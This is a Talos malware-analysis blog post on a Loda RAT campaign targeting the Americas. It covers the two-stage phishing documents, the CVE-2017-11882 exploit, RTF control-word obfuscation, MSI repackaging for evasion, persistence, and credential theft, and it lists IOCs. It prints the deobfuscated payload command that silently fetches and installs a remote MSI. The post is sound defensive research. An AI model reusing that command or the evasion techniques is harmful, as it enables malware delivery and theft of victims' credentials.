Loda RAT Grows Up
blog.talosintelligence.com/2020/02/loda-rat-grows-up.html

By Chris Neal.
Over the past several months, Cisco Talos has observed a malware campaign that
utilizes websites hosting a new version of Loda, a remote access trojan (RAT) written in
AutoIT.

1/12

These websites also host malicious documents that begin a multi-stage infection chain
which ultimately serves a malicious MSI file. The second stage document exploits
CVE-2017-11882 to download and run the MSI file, which contains Loda version 1.1.1.
This campaign appears to be targeting countries in South America and Central
America, as well as the U.S.

What's New?
Talos has observed several changes in this version of Loda. The obfuscation technique used
within the AutoIT script changed to a different form of string encoding. Multiple persistence
mechanisms have been employed to ensure Loda continues running on the infected host
following reboots. Lastly, the new version leverages WMI to enumerate antivirus solutions
running on the infected host.

How Did it Work?
The Loda sample analyzed in this post is delivered via a document chain. The first contains
an OOXML relationship to a second document that contains an exploit. Once the exploit is
triggered, an MSI file that contains the Loda RAT is downloaded to the target host and
executed. While the main purpose of this RAT is to steal usernames, passwords, and
cookies saved within browsers, it also has keylogging, sound recording, screenshotting and
the ability to allow the threat actor to send messages to the infected host.

So What?
Loda is a simple, yet effective, RAT that has matured over time. This RAT is a good example
of how effective relatively simple techniques combined with basic obfuscation can be. The
techniques this malware employs are of fairly low complexity and show that slight changes in
implementation can significantly reduce detection rates.

The Campaign
Telemetry from Cisco Umbrella shows that this campaign is quite active and seems to be
targeting countries in South America, Central America and the U.S. The majority of the
queries to the C2 domain "4success[.]zapto[.]org" originate from Brazil, Costa Rica and the
United States. Similarly, the queries to "success20[.]hopto[.]org" originate from Argentina,
Brazil and the United States. Our telemetry also shows that C2 communications go as far
back as the last quarter of 2019.

Infection chain
At the time of analysis, several steps of the infection chain had a relatively low detection rate
due to various obfuscation techniques. The initial document is delivered via a phishing email
that contains the first-stage document as an attachment.

4/12

Example of an email from this campaign

The first document in the infection chain, titled in one instance "comprobante de confirmaci√≥n
de pago.docx" contains an OOXML relationship, located in "/word/_rels" that points to a
second document at "http://lcodigo[.]com/apiW/config/uploads/tmp/documento.doc". Aside
from this OOXML relationship, the initial document isn't particularly noteworthy. The
document uses this two-stage document technique to bypass some email filters.

OOXML Relationship

The second document is a Rich Text Format document that contains a payload within an
obfuscated OLE object which is then executed by exploiting CVE-2017-11882, an arbitrary
code execution vulnerability in some versions of Microsoft Office. The contents of the Author
field, "obidah qudah" in the metadata of this document appears to be constant across all
samples analyzed during the investigation.
When we looked deeper into this author's name, we discovered they have a relatively long
history of being associated with malicious RTF documents. Starting in 2017, there have been
just under 1,300 malicious documents submitted to VirusTotal that contain "obidah qudah" in
the author field. An overwhelming majority of these submissions are RTF documents that
exploit CVE-2017-11882.

5/12

However, the "Last Modified By" field is not static throughout these documents. There appear
to be multiple campaigns over the last few years, starting in 2017, that use the "obidah
qudah" author name, with each campaign using a different "Last Modified By" field, with
many serving malware other than Loda. It is unclear whether these campaigns were initiated
by the same threat actor, or if a single malicious RTF document builder was used by multiple
different actors. In the documents analyzed in this post, the "Last Modified By" value is set to
"Richard."

Author labeled as "obidah qudah"

The OLE object within this document that contains the exploit and payload employs an
interesting obfuscation technique that utilizes RTF control words.

6/12

Obfuscated payload

The control word "\par" used in the object indicates the end of a paragraph, while the "\*" has
a slightly more complex function. The "\*" control word instructs an RTF reader to ignore the
following control words only if they are not understood by the reader, which allows the author
to include false control words (ex: \par67234). Using this technique to break up the OLE
object not only obfuscates the payload but also does not allow RTF parsers to read the
object in its entirety. Once it is executed, the control words will be ignored, concatenating the
bytes in between into the exploit payload as shown below.

Deobfuscated payload

Within this payload, the command "cmd.exe & /C CD C: & msiexec.exe /i
http://lcodigo[.]com/apiW/config/uploads/tmp/fkrkdn.msi /quiet" can be seen. Once the exploit
is triggered, a malicious MSI file is then downloaded and executed.

7/12

This MSI was created using Exe2Msi, a common tool used to repackage Windows
executables as an MSI file. Although this tool is most often used with legitimate software, it is
also frequently used by malware authors. One of the benefits of delivering malware in an
MSI package is that it provides a lower detection rate. Simply repackaging a malicious
executable as an MSI file can reduce detection rates with very little effort. If repackaged as
an MSI, the detection rate of a malicious executable can drop by up to 50 percent on
VirusTotal. Combined with other forms of obfuscation, this can result in a crude, yet effective,
means of evasion.

The malware
At execution, "fkrkdn.msi" extracts an executable at "C:\Users\
<user>\AppData\Roaming\Windata\JLMWFF.exe." This is the Loda 1.1.1 binary, which is a
compiled AutoIT script. A detailed write-up by Proofpoint on a previous version of Loda and
its functionality can be found here.
The initial C2 beacon was captured from "JLMWFF.exe" which contained the unique
signature "ZeXro0" repeated several times, which is not present in other versions of Loda.
The C2 comms pointed to "4success[.]zapto[.]org" contain information about the infected
host, including OS version, architecture and username. This also reveals that this version of
Loda is "1.1.1." Aside from the unique signature, this beacon format is the same as previous
versions.
Even though this new version of Loda has nearly identical functionality as previous versions,
there are significant differences in implementation and design. Some of the functions within
the script have been completely rewritten, with the most readily apparent change being the
obfuscation technique used. In version 1.1.1, almost every string or variable is obfuscated
using the simple encoding algorithm shown below.

Loda's encoding algorithm

There are a few key changes in functionality in version 1.1.1. To detect what antivirus
8/12

software is running on the host, earlier versions of Loda would call the AutoIT function
PROCESSEXISTS() for each antivirus software process name. Loda 1.1.1 now makes a
WMI query to "winmgmts:\\localhost\root\SecurityCenter2" to enumerate installed antivirus
solutions, as shown below in the deobfuscated code:

AV enumeration function

For persistence, the new version now adds both a registry key and a scheduled task:

Persistence mechanism

A new capability this version has is the ability to read the contents of
"\filezilla\recentservers.xml". This document contains the IP addresses, usernames and
passwords of servers that Filezilla has recently connected to. It is important to note that
these passwords are stored in either plaintext or encoded in base64.
One interesting functionality that persists through the versions of Loda is the command
"QURAN". This command streams music from "live.mp3quran[.]net:9976" in Windows Media
Player using the Microsoft Media Server (MMS) protocol. MMS is a deprecated Microsoft
proprietary network streaming protocol used to stream media in Windows Media Player.

"QURAN" command function
There is no other functionality to this command other than playing the music that is streaming
at this URL to the infected host.

Conclusion

9/12

Although the functionality of this new version of Loda is similar to previous versions, this new
iteration is a slightly more well-developed RAT. Loda is simple yet has proven to be effective,
and poses a serious threat to an infected host. The credential stealing capabilities could lead
to significant financial loss or a potential data breach. By changing the obfuscation
techniques the threat actor was able to lower the detection rate considerably. The change in
persistence mechanisms and AV solution detection show that the malware authors are
actively improving the functionality of Loda.
